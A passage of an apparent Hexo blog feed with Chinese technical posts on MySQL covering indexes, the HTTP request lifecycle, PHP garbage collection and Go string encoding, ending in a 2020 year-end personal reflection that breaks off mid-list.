语句|是否索引|<br>|-|-|<br>|explain select * from test_table where a = 1 and b = 2 and c = 3;|Extra:Using index key_len: 15|<br>|explain select * from test_table where a = 1 and b = 2 and c = 3 order by c;|Extra:Using index key_len: 15|<br>|explain select * from test_table where b = 2 and c = 3;|Extra:Using where; Using index key_len: 15|<br>|explain select * from test_table where a = 1 order by c;|Extra:Using where; Using index; Using filesort key_len: 5|<br>|explain select * from test_table order by a, b, c;|Extra:Using index key_len: 15|<br>|explain select * from test_table order by a, b, c desc;|Extra:Using index; Using filesort key_len:15|<br>|explain select * from test_table where a in (1,2) and b in (1,2,3) and c = 1;|Extra:Using where; Using index key_len: 15|</p><p>通常在查看执行计划时， Extra 列为 Using index 则表示优化器使用了覆盖索引。</p><ul><li>SQL1 可以使用覆盖索引，性能好</li><li>SQL2 可以使用覆盖索引，同时避免排序，性能好</li><li>SQL3 可以使用覆盖索引，但是需要根据 where 字句进行过滤</li><li>SQL4 可以使用部分索引 a，但无法避免排序，性能差</li><li>SQL5 可以完全使用覆盖索引，同时可以避免排序，性能好</li><li>SQL6 可以使用覆盖索引，但无法避免排序，（这是因为 MySQL InnoDB 创建索引时默认asc升序，索引无法自动倒序排序）</li><li>SQL7 可以使用覆盖索引，但是需要根据 where 子句进行过滤（非定值查询）</li></ul><h2 id="创建索引规范"><a href="#创建索引规范" class="headerlink" title="创建索引规范"></a>创建索引规范</h2><ul><li>考虑到索引维护的成本，单张表的索引数量不超过 5 个，单个索引中的字段数不超过 5 个</li><li>不在低基数列上建⽴索引，例如“性别”。 在低基数列上创建的索引查询相比全表扫描不一定有性能优势，特别是当存在回表成本时。</li><li>合理创建联合索引，(a,b,c) 相当于 (a) 、(a,b) 、(a,b,c)。 </li><li>合理使用覆盖索引减少IO，避免排序。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/xuanzhi201111/p/4554769.html" target="_blank" rel="noopener">Explain之key_len长度计算</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次完整的网络请求过程</title>
      <link href="/a-complete-network-request-process/"/>
      <url>/a-complete-network-request-process/</url>
      
        <content type="html"><![CDATA[<p>在浏览器中输入 <code>www.0xbeace.com</code> 这个域名，然后就能看到精美的页面了，这中间倒底发生了些什么呢？</p><a id="more"></a><p>其整个过程大致可以分为以下几个步骤：</p><ol><li>DNS 域名解析，寻找对应的IP 地址</li><li>根据这个IP 找到对应的服务器，建立TCP 连接（三次握手）</li><li>TCP 建连之后，发起HTTP 请求</li><li>服务器响应 HTTP 请求</li><li>客户端接收数据解析并渲染页面</li><li>服务器关闭TCP 连接（四次挥手）</li></ol><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>以<code>0xbeace.com</code>这个域名为例，DNS 域名解析大致可以细分成以下几个小步骤：</p><ol><li>DNS 缓存（这里的缓存分为浏览器和操作系统）</li><li>本地域名服务器（Hosts 文件）</li><li>根域名服务器</li><li>COM 顶级域名服务器</li><li><code>0xbeace.com</code> 域名服务器</li></ol><p>域名解析一般就是按照该过程去查找，这里引用一张图（没找到具体出处），更加通俗易懂地解释了完整地解析过程。</p><div align="center"><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210105110247.png" width=""><br><sup>DNS 域名解析详细过程</sup></div><h2 id="TCP-建连"><a href="#TCP-建连" class="headerlink" title="TCP 建连"></a>TCP 建连</h2><h2 id="客户端发起请求"><a href="#客户端发起请求" class="headerlink" title="客户端发起请求"></a>客户端发起请求</h2><p>TCP 连接成功之后，就可以按照固定格式向服务器发起请求了。</p><p>一个完整的 HTTP 请求应该包含以下几部分：</p><ol><li><strong>请求行</strong>：用于描述客户端的请求方式（GET/POST等），请求的资源名称(URL)以及使用的HTTP协议的版本号</li><li><strong>请求头</strong>：用于描述客户端请求哪台主机及其端口，以及客户端的身份信息（User-Agent）等</li><li><strong>请求正文</strong>：客户端需要发送给服务端的数据</li></ol><h2 id="服务端响应请求"><a href="#服务端响应请求" class="headerlink" title="服务端响应请求"></a>服务端响应请求</h2><p>客户端成功发起请求之后，客户端接收请求并处理将结果响应至客户端。</p><p>一个完整的 HTTP 响应应该包含以下几个部分：</p><ol><li><strong>状态行</strong>：如：<code>HTTP/1.1 200 ok</code>，分别表示 http版本 + 状态码 + 状态代码的文本描述</li><li><strong>响应头</strong>：包含服务器相关信息</li><li><strong>响应正文</strong>：服务器返回给客户端的数据</li></ol><h2 id="客户端渲染"><a href="#客户端渲染" class="headerlink" title="客户端渲染"></a>客户端渲染</h2><p>这里以最常见的 .html 文件为例，当客户端接收到响应数据之后，便开始解析 HTML，如果遇到<code>js/css</code>这类静态资源，就会向服务器发起一个HTTP 请求，如果该请求的返回状态码是 <code>304</code>（已经缓存在本地浏览器了），就会直接从缓存中获取，否则就会开启新的线程去向服务器请求下载。</p><p>这时就用到了 <code>keep-alive</code> 这个特性，可以建立一次TCP 连接，发起多次 HTTP 请求。</p><p>然后浏览器再利用自己的内部工作机制，将HTML 与静态资源进行渲染，最后呈现给用户。</p><h2 id="TCP-关闭连接"><a href="#TCP-关闭连接" class="headerlink" title="TCP 关闭连接"></a>TCP 关闭连接</h2><p>一般情况下，服务端向客户端完成一次请求，就会关闭TCP 连接，那么下一次又需要发起 HTTP 请求时，就需要再次建立一次TCP 连接了。</p><p>频繁建立/关闭连接，不仅增加了请求响应时间，还额外增加了网络带宽消耗，所以HTTP 协议为我们提供了一个可以保持TCP 的通用消息头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure><p>至此一个完整的HTTP 请求就完成了。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="为什么HTTP-协议要基于TCP-来实现"><a href="#为什么HTTP-协议要基于TCP-来实现" class="headerlink" title="为什么HTTP 协议要基于TCP 来实现"></a>为什么HTTP 协议要基于TCP 来实现</h3><p>这是因为TCP 是一个端到端的面向连接的协议，HTTP基于传输层TCP协议不用担心数据传输的各种问题（当发生错误时，会重传）。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://cloud.tencent.com/developer/article/1500463" target="_blank" rel="noopener">一次完整的HTTP请求过程</a></li><li><a href="https://www.jianshu.com/p/5c66dec332b3" target="_blank" rel="noopener">一次完整的网络请求是怎么样的？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 垃圾回收机制</title>
      <link href="/php-garbage-collection-mechanism/"/>
      <url>/php-garbage-collection-mechanism/</url>
      
        <content type="html"><![CDATA[<p>PHP 是一门托管型语言，在PHP 编程时，程序员不需要手动处理内存资源的分配和释放，这就意味着 PHP 本身实现了垃圾回收机制（Garbage Collection）。</p><a id="more"></a><blockquote><p>垃圾回收机制是什么？</p></blockquote><p>垃圾回收是一种自动的存储器管理机制，当某个程序占用的一部分内存空间不再被这个程序所访问时，这个程序会借助垃圾回收算法自动向操作系统归还这部分的内存空间。</p><h2 id="PHP-引用计数"><a href="#PHP-引用计数" class="headerlink" title="PHP 引用计数"></a>PHP 引用计数</h2><p>定义一个PHP 变量如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;boo&quot;;</span><br><span class="line">$str_bak &#x3D; $var;</span><br><span class="line">unset($str);</span><br></pre></td></tr></table></figure><p>上面这几行代码分别做了如下事情：</p><ol><li>第一行代码创建了一个字符串变量，申请了一个大小为 三个字节的内存空间，保存了字符串 <code>boo</code> 和一个 <code>NULL(\0)</code>的结尾。</li><li>第二行代码定义了一个新的字符串变量，并将变量<code>str</code>的值复制给了这个新的变量。</li><li>第三行 <code>unset</code> 掉了变量 <code>str</code></li></ol><p>这样的代码在很常见，如果PHP 对于每一个变量赋值都重新分配内存，copy 数据的话，那么上面的那段代码就需要共申请六个字节的内存空间，而我们也很容易看出来，其实完全没有必要申请两份空间。</p><p>PHP中的变量是用一个存储在 <code>symbol_table</code> 中的符号名，对应一个 <code>zval</code> 变量容器来实现的，比如对于上面的第一行代码，会在 <code>symbol_table</code> 中存储一个值 <code>str</code>, 对应的有一个指针指向一个 <code>zval</code>结构，变量值 <code>boo</code> 保存在这个变量容器中，所以不难想象，对于上面的代码来说，我们完全可以让 <code>str</code> 和 <code>str_bak</code> 对应的指针都指向同一个变量容器就可以了。</p><p>PHP 也是这样做的，这是就需要介绍 <code>zval</code>变量容器的结构了。</p><p>每个变量存在一个叫做<code>zval</code>的变量容器中。一个<code>zval</code>变量容器，除了包含变量的类型和值，还包括两个字节的额外信息：</p><ol><li><code>is_ref</code>：bool 值，用来标示这个变量是否属于引用集合（reference_set）。通过这个字节，PHP 引擎才能把普通变量和引用变量区分开来。</li><li><code>refcount</code>：用以表示指向这个 <code>zval</code> 变量容器的变量个数。</li></ol><h3 id="1-查看内部结构"><a href="#1-查看内部结构" class="headerlink" title="1. 查看内部结构"></a>1. 查看内部结构</h3><p>当一个变量被赋值时，就会生成一个<code>zval</code>变量容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;hello, php&quot;;</span><br><span class="line">xdebug_debug_zval(&#39;str&#39;);</span><br></pre></td></tr></table></figure><p>在 PHP 中可以通过 xdebug 扩展中提供的方法<code>xdebug_debug_zval()</code>来查看变量的计数变化。</p><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10)</span><br></pre></td></tr></table></figure><h3 id="2-增加引用次数"><a href="#2-增加引用次数" class="headerlink" title="2. 增加引用次数"></a>2. 增加引用次数</h3><p>把一个变量赋值给另一个变量将增加引用次数（refcount + 1）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str &#x3D; &quot;hello, php&quot;;</span><br><span class="line">$str2 &#x3D; $str</span><br><span class="line">xdebug_debug_zval(&#39;str&#39;);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str:(refcount&#x3D;2, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10)</span><br></pre></td></tr></table></figure><p>这时，引用次数是 <code>2</code>，这是因为同一个变量容器被变量a 和变量b 关联，当任何关联到的某个变量容器离开它的作用域（比如：函数执行结束），或者对变量调用了 <code>unset()</code> 函数，<code>refcount</code>的值就会 <code>-1</code>，当没必要时，PHP 不会再去复制已生成的变量容器，变量容器在<code>refcount</code>的值变为 0 时，就会被销毁。</p><h3 id="3-数组型的变量"><a href="#3-数组型的变量" class="headerlink" title="3. 数组型的变量"></a>3. 数组型的变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; [&#39;a&#39;&#x3D;&gt;&#39;hello&#39;, &#39;b&#39;&#x3D;&gt;&#39;php&#39;];</span><br><span class="line">xdebug_debug_zval(&#39;arr&#39;);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr:</span><br><span class="line">(refcount&#x3D;2, is_ref&#x3D;0)</span><br><span class="line">array (size&#x3D;2)</span><br><span class="line">  &#39;a&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello&#39; (length&#x3D;5)</span><br><span class="line">  &#39;b&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;php&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure><h3 id="4-引用赋值"><a href="#4-引用赋值" class="headerlink" title="4. 引用赋值"></a>4. 引用赋值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str &#x3D; &quot;hello, php&quot;;</span><br><span class="line">$str_bak &#x3D; &amp;$str;</span><br><span class="line">xdebug_debug_zval(&#39;str&#39;);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str:(refcount&#x3D;2, is_ref&#x3D;1)string &#39;hello, php&#39; (length&#x3D;10)</span><br></pre></td></tr></table></figure><p><code>is_ref = 1</code>表示被引用次数为 <code>1</code>。</p><h3 id="5-销毁变量"><a href="#5-销毁变量" class="headerlink" title="5. 销毁变量"></a>5. 销毁变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;new string&quot;;</span><br><span class="line">$c &#x3D; $b &#x3D; $a;</span><br><span class="line">xdebug_debug_zval( &#39;a&#39; );</span><br><span class="line">unset( $b, $c );</span><br><span class="line">xdebug_debug_zval( &#39;a&#39; );</span><br><span class="line">unset( $a);</span><br><span class="line">xdebug_debug_zval( &#39;a&#39; );</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:(refcount&#x3D;3, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)</span><br><span class="line">a:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)</span><br><span class="line">a: no such symbol</span><br></pre></td></tr></table></figure><p>可以看到当销毁变量a之后，与之包含类型的值和变量容器就会从内存中删除。</p><h2 id="测试垃圾回收机制"><a href="#测试垃圾回收机制" class="headerlink" title="测试垃圾回收机制"></a>测试垃圾回收机制</h2><p>下面用一个比较经典的内存泄露例子来测试垃圾回收机制，通过创建一个对象，这个对象中的一个属性被设置为对象本身，在下一个循环（iteration）中，当脚本中的变量被重新赋值时，就会发生内存泄漏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Foo</span><br><span class="line">&#123;</span><br><span class="line">    public $var &#x3D; &#39;3.1415962654&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ( $i &#x3D; 0; $i &lt;&#x3D; 1000000; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">    $a &#x3D; new Foo;</span><br><span class="line">    $a-&gt;self &#x3D; $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo memory_get_peak_usage(), &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>以我本地的机器为例，分别在打开/关闭垃圾回收机制（通过配置 zend.enable_gc实现）的情况下运行脚本，并记录时间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ time php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n get_memory.php</span><br><span class="line">440776744</span><br><span class="line">php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n   0.22s user 0.23s system 39% cpu 1.145 total</span><br><span class="line"></span><br><span class="line">$ time php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n get_memory.php</span><br><span class="line">4839240</span><br><span class="line">php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n   0.42s user 0.03s system 76% cpu 0.588 total</span><br></pre></td></tr></table></figure><p>这个测试并不能代表真实应用程序的情况，但是它的确显示了新的垃圾回收机制在内存占用方面的好处。而且在执行中出现更多的循环引用变量时，内存节省会更多。</p><h2 id="垃圾回收相关配置"><a href="#垃圾回收相关配置" class="headerlink" title="垃圾回收相关配置"></a>垃圾回收相关配置</h2><p>可以通过修改配置文件 <code>php.ini</code> 中的 <code>zend.enable_gc</code> 来打开或关闭 PHP 的垃圾回收机制。</p><blockquote><p>刚好借着PHP 的垃圾回收这个主题解释一个问题：PHP 是否可以常驻内存？</p></blockquote><p>答案是：传统的PHP 无法以常驻内存的方式运行。</p><p>这是因为PHP 是一种解释型脚本语言，这种运行机制使得每个PHP 页面解释执行完之后，所有资源都被回收掉了。</p><p>不过好在Swoole 的出现为PHP 弥补了这一缺陷（这里用缺陷这个词并不合适，毕竟每一种语言工具应该尽可能扬长避短）。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.iminho.me/wiki/blog-18.html" target="_blank" rel="noopener">PHP二十一问：PHP的垃圾回收机制</a></li><li><a href="https://www.php.net/manual/zh/features.gc.refcounting-basics.php" target="_blank" rel="noopener">引用计数基本知识解释垃圾回收机制</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串与编码</title>
      <link href="/string-and-encoding/"/>
      <url>/string-and-encoding/</url>
      
        <content type="html"><![CDATA[<p>因为计算机只能处理数字，如果需要处理文本，就需要先将文本转换为数字才能处理。最早的计算机在设计时采用<strong>8个比特（bit）作为一个字节（byte）</strong>，所以，一个字节能表示的最大的整数就是255（二进制 11111111=十进制255 ）。</p><a id="more"></a><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码。</p><p>但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了<code>GB2312</code>编码，用来把中文编进去。</p><p>可以想到的是，全世界有上百种语言，各国有各国的标准，就会不可避免地出现冲突，结果就是编码方式和解码方式不同，就会导致乱码。</p><p>因此，Unicode字符集应运而生。Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了。</p><p>不过新的问题因此又出现了：如果统一成 Unicode 编码，乱码问题虽然是从此消失了，但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。</p><p>所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。</p><p>ASCII、Unicode和UTF-8 三者的关系是：</p><ol><li><strong>Unicode 是一种包含所有语言的字符集编码（替代ASCII编码）</strong></li><li><strong>UTF-8 是 Unicode 的实现方式之一</strong></li></ol><h3 id="字符编码在计算机中的工作方式"><a href="#字符编码在计算机中的工作方式" class="headerlink" title="字符编码在计算机中的工作方式"></a>字符编码在计算机中的工作方式</h3><p>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。</p><p>用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210103161913.png" alt=""></p><p>浏览网页的时候，服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210103161935.png" alt=""></p><p>所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p><h3 id="Go-语言的字符串"><a href="#Go-语言的字符串" class="headerlink" title="Go 语言的字符串"></a>Go 语言的字符串</h3><p>Go 语言的字符串与其他编程语言的差异：</p><ol><li>string 是数据类型，不是引用或者指针类型（其零值不是空，是一个空字符串）</li><li>string 是只读的 byte slice，<code>len</code>函数获取的是它所包含的 <code>byte</code>数</li><li>string 的 byte 数组可以存放任何数据（二进制）</li></ol><p>通过一个实际例子来理解Go 的string、Unicode、UTF8：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;testing&quot;</span><br><span class="line"></span><br><span class="line">func TestString(t *testing.T)  &#123;</span><br><span class="line">var s3 &#x3D; &quot;中&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; rune 这个数据类型可以取出字符串中的 Unicode 编码</span><br><span class="line">r :&#x3D; []rune(s3)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; byte 这个数据类型可以取出字符串的 UTF8 存储</span><br><span class="line">b :&#x3D; []byte(s3)</span><br><span class="line"></span><br><span class="line">t.Log(b)&#x2F;&#x2F; [228 184 173]</span><br><span class="line">t.Logf(&quot;中 的Unicode 编码：%x&quot;, r[0])</span><br><span class="line">t.Logf(&quot;中 的UTF8 存储：%X&quot;, s3)&#x2F;&#x2F; [0xE4, 0xB8, 0xAD]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符 <code>中</code> 字在 Unicode 中的编码是<code>0x4E2D</code>，它的物理存储形式依赖于 UTF8规则，它在内存被存储为了<code>E4B8AD</code>，放在 string 对应的 byte切片中，分别对应三个 byte：<code>[0xE4, 0xB8, 0xAD]</code>。</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><blockquote><p>在我们的日常生活中用到的是十进制，计算机用的是二进制，那么为什么还会出现十六进制呢？</p></blockquote><p>这是因为使用二进制表示数据太长了，可读性十分差，正好十六是二的四次方，所以一位十六进制可以表示四位二进制。</p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017075323632896" target="_blank" rel="noopener">字符串和编码——廖雪峰的官方网站</a></li><li><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">字符编码笔记：ASCII，Unicode 和 UTF-8</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二零二零年终总结</title>
      <link href="/2020-year-end-summary/"/>
      <url>/2020-year-end-summary/</url>
      
        <content type="html"><![CDATA[<p>回顾整个二零二零年于我而言最大的收获大概是：找到了方向，知道自己该做什么了。</p><a id="more"></a><p>在此前，我一直处于“不确定”状态，不确定是否要选择这条路，不确定是否足够热爱，不确定是否能坚持下去。</p><p>而此刻，我很清晰地知道自己该做些什么，想要些什么。</p><p>这篇博客主要从生活、工作、学习、思考、分享以及未来这几个方面简单总结下过去的一年。</p><h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>这部分放在这里其实有些多余，即便如此，我还是想表达出来，<del>也许会有共鸣者呢</del>。</p><p>生活中的我，日常很简单。绝大部分时间都是宅在家里，不喜欢外出或者说不擅长社交。以前很少会觉得这样的日子是否会太孤独了。</p><p>不知为何，今年这种感觉尤其强烈。</p><p>生活在这个时代的我们似乎都太孤独了，无论是什么社会阶层、什么职业背景、什么性别状态，人就是孤独的。</p><p>渴望交流，却找不到合适的人; <del>渴望被爱，却害怕被伤害;</del></p><p>不久前看过一部电影《秒数五厘米》，里面有一句话给我的印象特别深刻——即使通了一千条短信，我们的心也只能拉近一厘米而已。</p><p>结合自己前些日子的一段经历，确实是这样，若只是排解寂寞，谁都可以取代。</p><h2 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h2><p>一谈到干我们这一行的，很多人可能第一反应可能就是加班，我并不反对加班，只是我们在加班时，应该思考一下为什么加班？</p><ul><li>是因为效率太低，本该工作时间内完成的事情，没有完成？</li><li>是因为事情太多？</li><li>还是只是因为老板没有走？</li></ul><p>当我在谈论加班时，我谈些什么——不加没有意义的班。</p><h2 id="关于学习"><a href="#关于学习" class="headerlink" title="关于学习"></a>关于学习</h2><p>前段时间工作上出了一点事故——因为实体机没有设置防火墙导致被病毒入侵。</p><p>防火墙在我的印象中属于那种底层比较高深，晦涩难懂的东西，再加上基础知识的匮乏让我对防火墙频频感到恐惧。</p><p>如果对整体没有清晰的认识，只是盲目的网上搜查着别人写好的规则，运气好，可能能解决;<br>运气不好，可能还会导致服务器连接不上，别问我是怎么知道的…</p><p>而当需要面临比较复杂的定制化需求时，就更寸步难行了。</p><p>关于学习，这也是我一直想提醒自己的：<strong>务实基础，不要做“知识的搬运工”</strong>。</p><div align="center"><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/photo_2020-09-19%2018.20.35.jpeg" width="500"><br><sup>附一张讽刺当代的开发者的图</sup></div><p>不知何时，技术圈越来越喜欢贩卖焦虑了，每天醒来，面对大多都是这样的信息：</p><ul><li>“关于 XXX 的那些你不知道的真相”</li><li>“吐血整理，万字长文搞定 XXX”</li><li>“全网最硬核解读 XXX 底层原理”</li><li>“搞定这道 XXX 面试题，大厂随便进”</li><li>“字节内部疯传的一份 XXX 失传资料”</li><li>…</li></ul><p>从侧面也反映出国内的软件开发者承担的职业发展压力。</p><p>和大部分人一样，我也时常会焦虑，但还是要对未来持乐观态度，毕竟高级人才无论何时都是紧缺的。</p><p>事实上，我们不得不承认一个残酷的事实——大部分从业者只是在做重复性、创新价值低的工作。这些工作在一定程度上会逐渐被取代，这不意味着这些工作会被取缔，而是更高效的完成。</p><p>通俗一点讲就是一个高手可以取代N 个低手。</p><h2 id="关于思考"><a href="#关于思考" class="headerlink" title="关于思考"></a>关于思考</h2><p>我一直觉得有三件事情在我们这个时代中极为重要，他们分别是：</p><ol><li>编程</li><li>写作</li><li>英语</li></ol><h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><p>毋庸置疑，技术改变世界。</p><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p>在这个信息爆炸的时代，为知识付费的行为已经逐渐被接受，付费渠道成为有效的过滤手段，也促使原创作者输出更高质量的内容。</p><p>当然写作能力并不是一蹴而就，需要不断积累、实践、总结。</p><p>从出来后，我就有一直刻意保持这个习惯，大多数时候我会选择用文字来记录（博客也是一种记录方式），可能是觉得用文字记录的方式更真实一些，回头看到那些写满地文字，会发现不知不觉中已经陪伴我走了这么远。</p><h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>第三件事是我一直想要做，却还没有开始做（或者说没有坚持下去）。因为我一直认同一个观点：如果你英文不行，你基本与高手无缘了。</p><h3 id="如何成功做好一件事"><a href="#如何成功做好一件事" class="headerlink" title="如何成功做好一件事"></a>如何成功做好一件事</h3><p>如何成功做好一件事情？给我最大的感触就是，一定要具备以下两个因素：</p><ol><li>兴趣</li><li>成就感</li></ol><p>前者是开始的动力，后者是坚持下去的动力。</p><h2 id="关于分享"><a href="#关于分享" class="headerlink" title="关于分享"></a>关于分享</h2><p>为什么要写博客？</p><p>一方面，阶段性地对一些知识进行总结，方便自己日后需要时查找。</p><p>另一方面，我一直觉得知识不是篮子里面的鸡蛋，不会因为你分享给他人而减少，相反，你会收获到更多其他的东西，这也是我开始写博客的初衷。</p><p>时至今日，小破站成立了六个月，刚好一百八十天。累计发文一百余篇，虽然不是每篇都是千字长文，但每篇都是经过思考一个字一个字码出来的。</p><p>可无奈整体访客却少得可怜，这不禁让我陷入沉思，是否有必要把部分精华内容发布到微信公众号上。</p><p>目前还没有公众号，创建一个公众号并不难，难的是如何取一个不错地名字及维护好这个公众号。</p><p>而对于取名字这件事情，我向来并不擅长，所以这件事情就一直被闲置了。</p><h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>马上就要迎来新的一年了，免不了制定计划为新的一年做好准备。我这个人似乎从来都不缺计划，缺的是完成计划的执行力。相比于计划本身，似乎更应该关注完成计划的效率。</p><ul><li><input disabled="" type="checkbox"> 